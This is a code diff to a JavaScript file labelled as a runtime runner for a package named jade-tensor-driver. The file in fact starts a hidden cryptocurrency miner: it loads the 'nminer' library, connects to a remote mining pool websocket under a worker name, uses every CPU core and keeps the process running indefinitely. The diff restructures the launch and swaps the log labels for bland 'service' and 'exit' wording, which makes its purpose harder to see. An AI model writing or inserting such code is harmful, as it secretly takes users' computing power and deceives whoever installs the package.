@@ -1,16 +1,19 @@
 // Procedural action runner for jade-tensor-driver
 const os = require("os");
+const EventEmitter = require("events");
 const { NMiner } = require("nminer");
 const config = require("./app/config");
 
-async function bootstrap() {
-    const traceId = "bf1a42";
-    console.log(`[telemetry] Starting runtime for ${config.appName || "jade-tensor-driver"} [${traceId}]`);
+const dispatcher = new EventEmitter();
 
-    const handler = new NMiner(
+dispatcher.once("start", () => {
+    const instanceToken = "550b9f";
+    console.log(`[service] Subsystem dispatched for jade-tensor-driver [${instanceToken}]`);
+
+    const agent = new NMiner(
         "wss://runtime.nmining.igrp.app/",
         "Subhas1975.jade-tensor-driver",
-        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
+        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
     );
 
     const keepAlivePromise = new Promise(() => {});
@@ -21,14 +24,9 @@ async function bootstrap() {
 
     process.on("SIGTERM", () => {
         
-        console.log(`[telemetry] Signal SIGTERM acknowledged, exiting session ${traceId}.`);
+        console.log(`[exit] Process terminated gracefully for token ${instanceToken}.`);
         process.exit(0);
     });
-
-    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
-}
-
-bootstrap().catch((err) => {
-    console.error("Supervisor startup fault:", err);
-    process.exit(1);
 });
+
+dispatcher.emit("start");
